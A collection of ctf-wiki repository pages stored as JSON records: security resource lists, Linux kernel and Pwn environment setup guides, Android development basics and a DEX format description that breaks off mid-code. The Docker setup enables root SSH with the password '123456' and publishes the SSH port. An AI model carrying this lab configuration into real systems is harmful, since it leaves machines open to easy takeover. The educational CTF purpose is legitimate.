{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/introduction/resources.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/introduction/resources.md", "content": "# Learning Resource\n!!! warning\n    Most of the resources on the current page are mainly websites from China (which may be inaccessible overseas) or are written in Chinese.\n\n    If you know of any global website or English-based website, can help to include it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/).\n\n## Online Learning\n\n-   [IChunQiu Information Security Learning Platform](http://www.ichunqiu.com)\n-   [KanXue Security Documentation](https://www.kanxue.com/chm.htm)\n-   [CTFHub](https://www.ctfhub.com/)\n\n## Learning path\n\n-   [Knownsec R&D Checklist v3.1](http://blog.knownsec.com/Knownsec_RD_Checklist/index.html)\n-   [BUGBANK Skill Tree ](https://skills.bugbank.cn/)\n-   [Security Skill Tree Basic by evilcos](http://evilcos.me/security_skill_tree_basic/index.html)\n-   [Security Related Mind Map by phith0n](https://github.com/phith0n/Mind-Map)\n-   [Book recommendation for Information Security](https://github.com/riusksk/secbook)\n-   [CTFHub Skill Tree](https://www.ctfhub.com/#/skilltree)\n\n## Information\n\n-   [FreeBuf.COM](http://www.freebuf.com/)\n-   [AnQuanKe](https://www.anquanke.com/)\n-   [RoarTalk](http://www.4hou.com/)\n-   [Sec-News](https://wiki.ioin.in/)\n\n## Forums\n\n-   [52Pojie](http://www.52pojie.cn)\n-   [KanXue](http://bbs.pediy.com/)\n-   [Aliyun XianZhi Community](https://xz.aliyun.com/)\n-   [IChunQiu](https://bbs.ichunqiu.com/)\n\n## CTF Competition\n\n-   [XCTF Community](https://www.xctf.org.cn/)\n-   [CTFtime](https://ctftime.org/)\n-   [CTFHub Calendar](https://www.ctfhub.com/#/calendar)\n\n## CTF OJ\n\n-   [XCTF OJ](http://oj.xctf.org.cn)\n-   [IChunQiu CTF Competition](https://www.ichunqiu.com/competition)\n-   [pwnhub](https://pwnhub.cn/index)\n-   [X1cT34m Information Security Lab](https://ctf.njupt.edu.cn/)\n-   [HackingLab Information Security Learning Platform](http://hackinglab.cn/)\n-   [BugkuCTF](http://ctf.bugku.com/)\n-   [WeChall](https://www.wechall.net/)\n-   [Sniper OJ](http://www.sniperoj.com/)\n-   [Jarvis OJ](https://www.jarvisoj.com/)\n-   [CTF Learn](https://ctflearn.com/)\n-   [Hackme CTF](https://hackme.inndy.tw/scoreboard/)\n-   [Practice CTF List](http://captf.com/practice-ctf/)\n-   [CTFHub Challenge](https://www.ctfhub.com/#/challenge)\n\n## CTF Tools\n\n-   [KanXue Tools](https://tools.pediy.com/)\n-   [52Pojie Tools](https://down.52pojie.cn/Tools/)\n-   [CTF Online Tools by CTFcode](http://ctf.ssleye.com/)\n-   [CTF Online Tools Box by bugku](http://tool.bugku.com/)\n-   [CTF Tools by HBCTF team](https://ctftools.com/down/)\n-   [ctf-tools by zardus](https://github.com/zardus/ctf-tools)\n-   [The Cyber Swiss Army Knife](https://gchq.github.io/CyberChef/)\n-   [CTFHub Tools](https://www.ctfhub.com/#/tools)\n\n## CTF Writeup Collections\n\n-   [CTFs Writeup](https://github.com/ctfs)\n-   [CTF Solution by p4 team](https://github.com/p4-team/ctf)\n-   [CTFHub Writeup](https://writeup.ctfhub.com/)\n\n## Other Resources\n\n-   [ShenTouShi](https://www.shentoushi.top/)\n-   [AnQuanQuan](https://www.anquanquan.info/)\n-   [NaviSec](https://navisec.it/)\n-   [XssSafe](https://www.xssav.com/)\n-   [Coco413 Blog](https://www.coco413.com/navi.html)\n-   [WLGF(mirror)](http://web.archive.org/web/20220327073119/https://www.milw0rm.cn/nav/)\n-   [SecWeb(mirror)](http://web.archive.org/web/20200912174524/https://thief.one/SecWeb/)\n", "timestamp": "2025-10-21T22:02:33.805631"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/pwn/linux/kernel-mode/basic-knowledge.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/pwn/linux/kernel-mode/basic-knowledge.md", "content": "# Introduction to Linux kernel\n\nIn this section, we will present some fundamental knowledge needed for learning the Linux kernel pwn, which is somewhat like a course of \"Tour on Operating System\".\n\n## Operating System Kernel\n\nOperating system kernel is indeed a kind of software, which is somehow like a middle layer between general applications and hardware resource. The kernel is designed for scheduling system resources, controling IO devices, manipulating network and filesystems, and providing fast APIs for high-level applications.\n\n![Kernel_Layout](./figure/Kernel_Layout.svg)\n\nActually, operating system kernel is an abstract concept. It is essentially the same as the user process, which is code + data located in physical memory. The difference is that the code of kernel is usually running on a high-privilege environment of the CPU, which has full hardware access capabilities. When executing the code of user-mode program, the CPU usually runs in a low-privilege environment, which only has partial hardware access capabilities or missing that.\n\nHow CPU distinguish these different running privileges? Here comes another hardware concept: **hierarchical protection domains**.\n\n## hierarchical protection domains\n\n**Hierarchical protection domains** (aka Rings) is a model that restrict the access capabilities of hardware resources in different levels, which is enforced from hardware level.\n\nIntel's CPUs have 4 different ring levels: ring0 (highiest privilege), ring1, ring2, ring3(lowest privilege). Generally we only use the ring0(for the kernel) and ring3(for the user-mode) in the design of modern operating systems.\n\n![Ring Model](./figure/ring_model.png)\n\nHence, we can give out two definitions:\n\n- `User mode(userland)`: CPU running under ring3, with context of user-mode program\n- `Kernel mode(kernelland)`: CPU running under ring0, with context of kernel-mode program\n\n## Mode switch (system call)\n\nWhile events like `system call`, `exception`, `interrupt` happens, the CPU will switch from user mode to kernel mode, and jump to corresponding handler functions.\n\nWe mainly focus on the system call, as it's the fundamental APIs for user mode programs to communicate with the kernel. The core process is like:\n\n> Note that the CPU is running under the kernel mode after system call instructions were processing.\n\n1. CPU swaps the value of `GS` register with another value saved in kernel by `swapgs` instruction, aiming to restore it after returning to the user land.\n2. \n\n> TBD\n", "timestamp": "2025-10-21T22:02:34.403917"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/pwn/linux/user-mode/environment.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/pwn/linux/user-mode/environment.md", "content": "## Introduction\n\nCurrently most of Pwn challenges in CTF are mainly about the binary exploitation under user mode in Linux, which means that usually we'll need to deploy a Linux operating environment locally for solving that. Generally it can be done by creating a Linux virtual machine as the challenge-solving environment, or just installing a Linux operating environment directly on your physical machine.\n\n[Ubuntu](https://ubuntu.com/) is the Linux distro that are mostly chosen as Pwn challenges' operating environment in CTF, therefore you might need to deploy a Ubuntu operating environment locally which is of the same version to the challenge's remote environment, so that you can have the same executing environment compared to that(including Libc binaries, etc.) for you to run  the target and exploit it correctly on your own PC. However, _it doesn't mean that you have to choose Ubuntu as youor primary Linux distro_, you can still choose to firstly use your favourite Linux distros as your primary OS(e.g., Gentoo Linux, openSUSE, Debian, Fedora, Arch Linux, NixOS, etc.), and deploy Pwn challenges' environments on your PC with tools like Docker and Podman which adopt container techniques to create dedicated environments conveniently.\n\nFor legacy Pwn challenges in CTF, the following tools are usually the core ones for solving challenges:\n\n- IDA: A reverse engineering tool for analyzing binaries provided by challenges.\n- Python + pwntools: Core utilities for crafting scripts for binary exploitation.\n- gdb + pwndbg or peda: Debugger with enhanced plugins to run and debug the target.\n\nNote that at the earliest stage of learning Pwn, we do not recommend you to use software packages that have been over-wrapped base on pwntools to craft your exploitation script, while over-using lambda statements to simplify the exploitation script is also not recommended, as which might have some potential negative effects on your thoughts on some deep aspects of the whole computer science. What we recommend to do is that you should start to use such custom configuration after you have enough knowledge and skills on computer science and Pwn.\n\n## Deploy local environment for solving Pwn challenges in CTF\n\nTo make sure that our exploitation script can make attacks on remote successfully, usually we need to deploy a same operating environment locally, and have the local attacking test successfully on local before exploiting on remote. However, as various CTF challenges will always have different environments, it will waste lots of your storage to hold many of different and entire OS environments.\n\nAs what we usually need to only the Libc environment besides the target itself, it might be a solution to try to load different `libc.so.6` executables with arguments like `LD_PRELOAD` while running the target programs of Pwn challenges. However such approaches are not always avaliable due to complex executation-dependencies chains including `ld` and some other things, which will result in `segmentation falut` while doing the crossing-version Libc loading and executing.\n\nThough user-mode executables in Linux do not have a strong compatibility compared to those under Windows, the whole executing environment in fact relies on the system APIs known as `system call` provided by the OS kernel, which are generally not being changed to result in the compatibility to be broken. Thus light weight virtualization solutions like Docker can easily help us to build corresponding environments for running and debugging Pwn challenges.\n\n### Install Docker\n\nPlease refer to Docker's [official website](https://docs.docker.com/engine/install/) to see how to install docker on your machine, or you can also do that refer to your distro's official Wiki (e.g., like [Gentoo Wiki - Docker](https://wiki.gentoo.org/wiki/Docker)). We do not keep a copy here due to Linux distros vary.\n\n### Build a Docker image for Pwn\n\nHere's a Docker template including usual tools for solving Pwn challenegs. You can also modify it freely according to your needs:\n\n```dockerfile\nFROM ubuntu:24.04\n\nARG DEBIAN_FRONTEND=noninteractive\n\n# pre-install softwares\nRUN dpkg --add-architecture i386\nRUN apt-get -y update && apt-get upgrade -y\nRUN apt-get install -y lib32z1 apt-transport-https \\\n    python3 python3-pip python3-venv python3-poetry python3-dev python3-setuptools \\\n    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev libc6-dbg libc6-dbg:i386 libgcc-s1:i386 \\\n    vim nano netcat-openbsd openssh-server git unzip curl tmux konsole wget sudo \\\n    bison flex build-essential gcc-multilib \\\n    qemu-system-x86 qemu-user qemu-user-binfmt \\\n    gcc gdb gdbserver gdb-multiarch clang lldb make cmake\n\n# enable ssh login\nRUN rm -f /etc/service/sshd/down\nRUN sed -ri 's/^#?PermitRootLogin\\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config &&\\\n    sed -ri 's/#UseDNS\\ no/UseDNS\\ no/g' /etc/ssh/sshd_config && \\\n    sed -ri \"s/StrictModes yes/StrictModes no/g\" /etc/ssh/sshd_config && \\\n    sed -ri \"s/UsePAM yes/UsePAM no/g\" /etc/ssh/sshd_config\n\n# enable login with password\nRUN echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config\n\n# defaultly we have a user `ubuntu` in the image\nRUN echo \"ubuntu:123456\" | chpasswd && \\\n    echo \"root:123456\" | chpasswd\n\n# add sudo\nRUN usermod -aG sudo ubuntu\n\n# enable ssh key login\n#RUN mkdir /home/ubuntu/.ssh && \\\n#    echo \"Your ssh key\" > /home/ubuntu/.ssh/authorized_keys\n\n# keep container running\nRUN echo \"#!/bin/sh\\nservice ssh restart\\nsleep infinity\" > /root/start.sh\nRUN chmod +x /root/start.sh\n\n# create venv for pip\nRUN python3 -m venv /pip_venv && \\\n    chown -R ubuntu:ubuntu /pip_venv && \\\n    echo \"\\n\\n# pip venv\\nsource /pip_venv/bin/activate\" >> /home/ubuntu/.bashrc\n\n# pwn-related tools\nRUN /pip_venv/bin/pip install -U pip && \\\n    /pip_venv/bin/pip install --no-cache-dir \\\n    pwntools \\\n    ropgadget \\\n    z3-solver \\\n    smmap2 \\\n    apscheduler \\\n    ropper \\\n    unicorn \\\n    keystone-engine \\\n    capstone \\\n    angr \\\n    pebble \\\n    r2pipe \\\n    LibcSearcher \\\n    poetry\n\nRUN git clone https://github.com/pwndbg/pwndbg && \\\n    cd pwndbg && chmod +x setup.sh && ./setup.sh\n\nCMD [\"/root/start.sh\"]\n\nEXPOSE 22\n```\n\nYou shall create a file named `Dockerfile` in an empty directory with contents above, and then run the following commands in terminal:\n\n```shell\n$ docker build -t pwnenv_ubuntu24 .\n```\n\n> If you could not build the docker image due to some network issues, using proxy may be a solution. All you need to do is to add following configurations in your Dockerfile:\n> \n> ```dockerfile\n> ENV HTTP_PROXY=http://your-proxy:port\n> ENV HTTPS_PROXY=http://your-proxy:port\n> ```\n> \n> If your proxy server is on local, you can also choose to build the docker image with local network by following command:\n> \n> ```shell\n> docker build --network=\"host\" -t pwnenv_ubuntu24 .\n> ```\n\nAfter the building has been done, you will get a Ubuntu24 image called `pwnenv_ubuntu24` locally, which can be find with `docker images` command:\n\n```shell\n$ docker images                                              \nREPOSITORY                                       TAG       IMAGE ID       CREATED             SIZE\npwnenv_ubuntu24                                  latest    64f87a598f87   2 hours ago    3.6GB\n```\n\nNow you can change the base image defined at the first line in Dockerfilw to build docker images for different Ubuntu distros.\n\n### Create container from Docker image\n\nWe can run the following command to create a container from the Docker image we've just built:\n\n```shell\n$ docker run \\\n\t-d \\\n\t-p 25000:22 \\\n\t--name=pwn24 \\\n\t-v ~/Desktop/CTF:/CTF \\\n\tpwnenv_ubuntu24\n```\n\nArguments of this command are:\n\n- `-d`： Running the container in the background.\n- `-p 25000:22`： map the port `22` of the container to the local port `25000`\n- `--name=pwn24`： name of the container is assigned as `pwn24`\n- `-v ~/Desktop/CTF:/CTF` ： map the local directory `~/Desktop/CTF` into the directory `/CTF` inside the container, so that we can access local files directly inside the container\n- `pwnenv_ubuntu24`：Docker image used to create the container\n\nThen we can execute into the container with following command:\n\n```shell\n$ docker exec -w /CTF \\\n        -e TERM=xterm-256color \\\n        -u ubuntu \\\n        -it pwn24 \\\n        bash\n```\n\nIf you do not want to share your local directory with the docker container, you can also use following commands to do the copy work between the container and the local:\n\n```shell\n$ docker cp local_source_path container_name:target_path_in_container\n$ docker cp container_name:source_path_in_container local_target_path\n```\n\nAs we have set up the ssh service for the container, we can also use ssh to connect, which allow us to use tools like `vscode` to manipulating files in container conveniently: \n\n```shell\n$ ssh root@localhost -p 25000\n```\n\nIf the environment of the container has been made to be broken unintentionally, we can just do the `docker remove container_name` to remove it, and just create a new one again with `docker run`. Note that this method will let us lose all the files we've copied into the container(except for attached local directories).\n\n### Connect the Docker container to local graphic system\n\nAs debug functions `gdb.attach()` from `pwntools` will need to create new window, running this inside the docker container directly will fail. Therefore we need to connect the container to local graphic system, so that we can run this function correctly.\n\n> You can also choose to configure the multi-windows system for the container with `tmux`, in which all we need to do is to run the `tmux` and run `context.terminal = ['tmux', 'splitw', '-h']` before calling the `gdb.attach()`.\n\n#### For Wayland\n\nFor DE under Wayland, we need to add the following additional arguments while creating the container:\n\n```shell\n$ docker run \\\n\t-d \\\n\t-p \"25000:22\" \\\n\t--name=pwn24 \\\n\t-v ~/Desktop/CTF:/CTF \\\n\t-e XDG_RUNTIME_DIR=/tmp \\\n\t-e DISPLAY=$DISPLAY \\\n\t-e WAYLAND_DISPLAY=$WAYLAND_DISPLAY \\\n\t-v $XDG_RUNTIME_DIR/$WAYLAND_DISPLAY:/tmp/$WAYLAND_DISPLAY \\\n\t-e QT_QPA_PLATFORM=wayland \\\n\tpwnenv_ubuntu24\n```\n\nThen all we need to do is to configure the `context.terminal` before calling `gdb.attach()` as follow, note that you should choose the right statement according to your desktop environment:\n\n```python\ncontext.terminal = ['konsole', '-e', 'sh', '-c'] # for KDE\ncontext.terminal = ['gnome-terminal', '-e', 'sh', '-c'] # for Gnome\n```\n\n#### For X11\n\nFor DE under X11, we need to add the following additional arguments while creating the container:\n\n```shell\n$ docker run \\\n\t-d \\\n\t-p \"25000:22\" \\\n\t--name=pwn24 \\\n\t-v ~/Desktop/CTF:/CTF \\\n\t-v /tmp/.X11-unix:/tmp/.X11-unix \\\n\t-e DISPLAY=$DISPLAY \\\n\tpwnenv_ubuntu24\n```\n\nThen all we need to do is to configure the `context.terminal` before calling `gdb.attach()` as follow, note that you should choose the right statement according to your desktop environment:\n\n```python\ncontext.terminal = ['konsole', '-e', 'sh', '-c'] # for KDE\ncontext.terminal = ['gnome-terminal', '-e', 'sh', '-c'] # for Gnome\n```\n\n> Refer to [Running pwnlib gdb (pwntools) feature inside Docker](https://gist.github.com/turekt/71f6950bc9f048daaeb69479845b672b).\n\n## Build the CTF Pwn environment locally\n\nBesides using the Docker, you can also directly build an environment for solving Pwn challenges locally. For legacy Pwn challenges in CTF, the following tools are usually the core ones for solving challenges:\n\n- IDA: A reverse engineering tool for analyzing binaries provided by challenges.\n- Python + pwntools: Core utilities for crafting scripts for binary exploitation.\n- gdb + pwndbg or peda: Debugger with enhanced plugins to run and debug the target.\n\n### Get the IDA\n\nIDA Pro (interactive Disassembler Professional) is a reverse-engineering tool developed by Hex-Rays, which is also the most popular tool for static analyzation in reverse engineering. With IDA Pro, we can easily recover the original code logic from the target binary, so that we can find vulnerabilities more conveniently.\n\nNote that [IDA Pro](https://hex-rays.com/ida-pro/) is not a free software, and the software itself and discompiler plugins for different ISA are charged dedicately.\n\n> Until 2024.04, the price of license for IDA is 1975USD, the price of discompiler plugin for a specific ISA is 2765USD.\n\nWhat's more is that, Hex-rays also provides a free reverse engineering tool called [IDA Free](https://hex-rays.com/ida-free/), which is based on cloud and only supports discompiler on X86. It might be enough to use for solving most of Linux Pwn challenges.\n\n### Install Python\n\nMost of Linux distros are installed with Python by default, therefore generally we do not need to install it manually. If you do not have a Python environment in the Linux environment on your computer, you can also choose to install it with your distro's package manager.\n\nNote that the default Python on some Linux distros might be Python2, and you might need to install the Python3 manually.\n\n### Confiogure venv\n\nSometimes you may encounter error messages like this while running `pip` command, which is due to the security restriction configuration of the Linux distro you use: \n\n```\nerror: externally-managed-environment\n\n× This environment is externally managed\n╰─> To install Python packages system-wide, try\n    zypper install python311-xyz, where xyz is the package\n    you are trying to install.\n    \n    If you wish to install a non-rpm packaged Python package,\n    create a virtual environment using python3.11 -m venv path/to/venv.\n    Then use path/to/venv/bin/python and path/to/venv/bin/pip.\n    \n    If you wish to install a non-rpm packaged Python application,\n    it may be easiest to use `pipx install xyz`, which will manage a\n    virtual environment for you. Install pipx via `zypper install python311-pipx` .\n\nnote: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.\n```\n\nTo handle this problem, we can choose to use the [venv](https://docs.python.org/zh-cn/3/library/venv.html#module-venv) module to create a virtual environment, which ensures the security of the system, and using such strategy also make us easy to rebuild the whole environment while in need. \n\nTo create a `venv`, we just need to run the following command(if the directory dose not existed, it'll be created):\n\n```shell\npython3 -m venv your_venv_direcory_path\n```\n\nThen we can easily get into the `vent` environment with `source` command:\n\n```shell\nsource your_venv_direcory_path/bin/activate         # for bash\nsource your_venv_direcory_path/bin/activate.fish    # for fish\nsource your_venv_direcory_path/bin/activate.csh     # for csh/tcsh\n```\n\n> You can also add this into your `~/.bashrc` file to run it by default.\n\nAs virtual environment provides us with features including lightweight, security, and rebuildability, we recommand you to create a Python venv for CTF/Pwn even if there's no security restriction for your `pip`.\n\n### Install pwntools\n\n[pwntools](https://docs.pwntools.com/en/stable/) is a powerful Python package for crafting exploitation script. You can install it with following commands:\n\n```shell\npython3 -m pip install --upgrade pip\npython3 -m pip install --upgrade pwntools\n```\n\n### Install gdb\n\nGNU Debugger (GDB) is a program debugger developed by GNU, we can use it to debug the binary executable conveniently.\n\nGDB is installed defaultlly on most of Linux distro, you can execute `gdb` command in your terminal to check for that (enter `q` to exit):\n\n```shell\n$ gdb\nGNU gdb (GDB; SUSE Linux Enterprise 15) 13.2\nCopyright (C) 2023 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nType \"show copying\" and \"show warranty\" for details.\nThis GDB was configured as \"x86_64-suse-linux\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://bugs.opensuse.org/>.\nFind the GDB manual and other documentation resources online at:\n    <http://www.gnu.org/software/gdb/documentation/>.\n\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\".\n(gdb) \n```\n\nIf you do not have gdb on your computer, you can install it with package manager for your Linux distro. Following is the command you may need to run. Note that we only list some of the most common Linux distros here:\n\nDebian / Ubuntu:\n\n```shell\nsudo apt-get install -y gdb\n```\n\nopenSUSE Leap / Tumbleweed / SLE:\n\n```shell\nsudo zypper install gdb\n```\n\nArch Linux / Manjaro / EndeavourOS:\n\n```shell\nsudo yay -S gdb # `pacman -S gdb` also works if you do not use the AUR\n```\n\nFedora / CentOS / RHEL:\n\n```shell\nsudo yum install gdb # yum is linked to dnf in fact\n```\n\n### Install pwndbg\n\n[pwndbg](https://github.com/pwndbg/pwndbg) (/paʊnˈdiˌbʌɡ/) is a powerful GDB plugin to enhance the debugging functionality of GDB. With this plugin we can get more detailed information like the layout of heap memory easily while debugging.\n\npwndbg itself has an installing script, so all we need to do is clone the project and run it:\n\n```shell\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\n./setup.sh\n```\n\nFor Linux distros using `nix` as their package manager (e.g. NixOS), you can install it with following commands:\n\n```shell\nnix shell github:pwndbg/pwndbg\npwndbg ./your-binary\n```\n\n### Install peda\n\n> Note: Only one of pwndbg and peda is needed to be installed. To avoid the potential conflicts, we do NOT recommand you to install both of them together.\n\n[peda](https://github.com/longld/peda) is a powerful GDB plugin to enhance the debugging functionality of GDB. With this plugin we can get more detailed information like the layout of heap memory easily while debugging.\n\nTo install the `peda`, all we need to do is clone the source code to local and update the GDB's configuration with following commands:\n\n```shell\ngit clone https://github.com/longld/peda.git ~/peda\necho \"source ~/peda/peda.py\" >> ~/.gdbinit\necho \"DONE! debug your program with gdb and enjoy\"\n```\n", "timestamp": "2025-10-21T22:02:34.845388"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/en/docs/usage.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/en/docs/usage.md", "content": "# How to use CTF Wiki\n\n## Introduction\n\nCTF Wiki consists of three projects:\n\n- [ctf-wiki](https://github.com/ctf-wiki/ctf-wiki) introduces basic knowledge for CTF.\n- [ctf-challenges](https://github.com/ctf-wiki/ctf-challenges) contains attachments and some writeups of CTF challenges introduced on Wiki.\n- [ctf-tools](https://github.com/ctf-wiki/ctf-tools) contains useful tools for CTF.\n\n## Get attachments of CTF challenges on Wiki\n\nYou can obtain attachments of CTF challenges on the Wiki in the [ctf-challenges](https://github.com/ctf-wiki/ctf-challenges) repository. For example, attachments of challenges in [Basic ROP](https://ctf-wiki.org/en/pwn/linux/user-mode/stackoverflow/x86/basic-rop/) can be found under <https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow>.\n", "timestamp": "2025-10-21T22:02:34.947113"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/missing-translation.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/missing-translation.md", "content": "!!! warning\n    The current page still doesn't have a translation for this language.\n\n    You can read it through Google Translate.\n\n    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/).\n\n", "timestamp": "2025-10-21T22:02:35.246679"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_develop/basic_develop.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_develop/basic_develop.md", "content": "# Android 开发基础\n\n在做 Android 安全之前，我们应该尽可能地了解 Android 开发的基本流程。\n\n## 基础知识\n\n依次阅读以下书籍，由浅入深地了解 Android 基本开发知识\n\n- 第一行代码，阅读完前七章即可\n- JNI/NDK 开发，目前尚未找到一本相关合适的指南。\n- Android 编程权威指南（可选）\n- Android 高级进阶（可选）\n\n在学习的过程中，个人觉得需要着重了解 Android 开发中如下知识\n\n- Android 系统架构\n- 基本源文件架构\n- 基本开发方式与代码编写惯例，了解常见代码的意思。\n- 了解 xml 等一些配置资源的文件格式。\n\n**一定要搭好基本的 Android 开发环境！！！！！**\n\n- java\n- ddms\n- ndk\n- sdk，多安装几个版本的 sdk，5.0-8.0\n\n## Apk 打包流程\n\n当编写完 App 相关的代码后，我们的最后一步就是将 App 中所有使用到的资源文件进行打包，打包流程如下图（<u>http://androidsrc.net/android-app-build-overview/</u>）所示：\n\n![](./figure/android_app_build.png)\n\n具体的操作如下\n\n1. 使用 aapt( The Android Asset Packing Tool ) 对资源文件进行打包，生成 R.java 文件。\n2. 如果项目中使用到了 AIDL（Android Interface Definition Language）提供的服务，则需要使用 AIDL 工具解析 AIDL 接口文件生成相应的 Java 代码。\n3. 使用 javac 将 R.java 和 AIDL 文件编译为 .class 文件。\n4. 使用 dx 工具将 class 和第三方的 library 转换为 dex 文件。\n5. 利用 apkbuilder 将第一步编译后的资源、第四步生成的 .dex 文件，以及一些其它资源打包到 APK 文件中。\n6. 这一部主要是对 APK 进行签名。可以分为两种情况，如果我们是要发布 App，那就采用 RealeaseKeystore  签名；反之，我们如果只是想要对 App 进行调试，那就使用 debug.keystore 签名。\n7. 在发布正式版之前，我们需要将 APK 包中资源文件距离文件的起始偏移修改为 4 字节的整数倍数，这样，在之后运行 App 的时候，速度会比较快。\n\n## Apk 文件结构\n\nAPK 文件也是一种 ZIP 文件。因此，我们可以使用解压 zip 的工具来对其进行解压。一个典型的 APK 文件的结构如下图所示。其中，关于每一部分的介绍如下\n\n![](./figure/apk_structure.png)\n\n\n- AndroidManifest.xml\n\n    - 该文件主要用于声明应用程序的名称，组件，权限等基本信息。\n\n- class.dex\n    - 该文件是 dalvik 虚拟机对应的可执行文件，包含应用程序的可执行代码。\n- resource.arsc\n    - 该文件主要是应用程序编译后的二进制资源以及资源位置与资源 id 之间的映射关系，如字符串。\n- assets\n    - 该文件夹一般用于包含应用程序的原始资源文件，例如字体和音乐文件。程序在运行的时候，可以通过API 获取这些信息。\n- lib/\n    - lib目录下主要用于存储通过 JNI（Java Native Interface）机制使用的本地库文件，并且会按照其支持的架构，分别创建对应的子目录。\n- res/\n    - 该目录主要包含了 Android 应用引用的资源，并且会按照资源类型进行存储，如图片，动画，菜单等。主要还有一个 value 文件夹，包含了各类属性资源\n- colors.xml-->颜色资源\n- dimens.xml--->尺寸资源\n- strings--->字符串资源\n- styles.xml-->样式资源\n- META-INF/\n    - 类似于 JAR 文件，APK 文件中也包含了 META-INF 目录，用于存放代码签名等文件，以便于用来确保 APK 文件不会被人随意修改。\n", "timestamp": "2025-10-21T22:02:36.284911"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_operating_mechanism/java_layer/dex/dex.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_operating_mechanism/java_layer/dex/dex.md", "content": "# DEX文件\n\n## 基本介绍\n\nGoogle 为 Android 中的 Java 代码专门设计了对应的可执行文件 DEX（Dalvik eXecutable File），适用于手机这样的内存低和处理器性能较差的移动平台。下面，我们就来主要介绍一下DEX文件的格式。\n\n## DEX 文件格式\n\n### 数据类型定义\n\n在介绍 DEX  文件的具体结构之前，我们先来关注一下 DEX 文件中所使用的一些基础的数据类型。\n\n| 名称        | 说明                         |\n| --------- | -------------------------- |\n| byte      | 8 位有符号整数                   |\n| ubyte     | 8 位无符号整数                   |\n| short     | 16 位有符号整数，采用小端字节序          |\n| ushort    | 16 位无符号整数，采用小端字节序          |\n| int       | 32 位有符号整数，采用小端字节序          |\n| uint      | 32 位无符号整数，采用小端字节序          |\n| long      | 64 位有符号整数，采用小端字节序          |\n| ulong     | 64 位无符号整数，采用小端字节序          |\n| sleb128   | 有符号 LEB128，可变长度（见下文）       |\n| uleb128   | 无符号 LEB128，可变长度（见下文）       |\n| uleb128p1 | 无符号 LEB128 加 `1`，可变长度（见下文） |\n\n其中之所以会采用变长的数据类型是因为希望可以尽可能减少可执行文件的占用空间，比如说如果一个字符串的长度为5，那么我们其实只需要一个字节即可，但是我们又不希望直接使用`u1` 来进行定义相应类型，因为这样会把所有的字符串长度都限制在相应的范围内。\n\n可变长度的类型其实都是基于 LEB128(Little-Endian Base) 类型的，可以用于表示 32 位大小的 int 数字，其根据所要表示的数字的大小来选择合适的长度。如下图所示，其中每个字节的最高位表示是否使用下一个字节，1 表示使用，0 表示不使用。故而每个字节其实只有 7 个有效的 bit 位用来表示相应的数字。如果有一个 LEB128 类型的变量使用了 5 个字节，并且第五个字节的最高位为 1 ，那说明出现了问题。\n\n![](./figure/leb128.png)\n\ndalvik中读取无符号leb128类型的函数如下\n\n```c++\nDEX_INLINE int readUnsignedLeb128(const u1** pStream) {\n    const u1* ptr = *pStream;\n    int result = *(ptr++);      //取第一个字节\n    if (result > 0x7f) {        //如果第1个字节大于0x7f,表示第一个字节最高位为1\n        int cur = *(ptr++);     //第2个字节\n        result = (result & 0x7f) | ((cur & 0x7f) << 7); //前两个字节\n        if (cur > 0x7f) {\n            cur = *(ptr++);\n            result |= (cur & 0x7f) << 14;\n            if (cur > 0x7f) {\n                cur = *(ptr++);\n                result |= (cur & 0x7f) << 21;\n                if (cur > 0x7f) {\n                    /*\n                     * Note: We don't check to see if cur is out of\n                     * range here, meaning we tolerate garbage in the\n                     * high four-order bits.\n                     */\n                    cur = *(ptr++);\n                    result |= cur << 28;\n                }\n            }\n        }\n    }\n    *pStream = ptr;\n    return result;\n}\n```\n\n举个例子，假如我们要计算c0 83 92 25的uleb128值，如下\n\n- 第一个字节的最高位为1，所以有第二个字节。result1 = 0xc0 & 0x7f=0x40\n- 类似的，第二个字节对应的result2 = (0x83 & 0x7f)<<7 = 0x180\n- 第三个字节对应的result3 = (0x92 & 0x7f) <<14 =  0x48000\n- 第四个字节对应的result4 = (0x25)<<21 = 0x4a00000\n- 该字节流对应的值为result1+result2+result3+result4 = 0x4a481c0\n\ndalvik中读取有符号的LEB128类型的数字如下\n\n```c++\n DEX_INLINE int readSignedLeb128(const u1** pStream) {\n    const u1* ptr = *pStream;\n    int result = *(ptr++);\n    if (result <= 0x7f) {\n        result = (result << 25) >> 25;   //符号扩展\n    } else {\n        int cur = *(ptr++);\n        result = (result & 0x7f) | ((cur & 0x7f) << 7);\n        if (cur <= 0x7f) {\n            result = (result << 18) >> 18; //符号扩展\n        } else {\n            cur = *(ptr++);\n            result |= (cur & 0x7f) << 14; //符号扩展\n            if (cur <= 0x7f) {\n                result = (result << 11) >> 11; 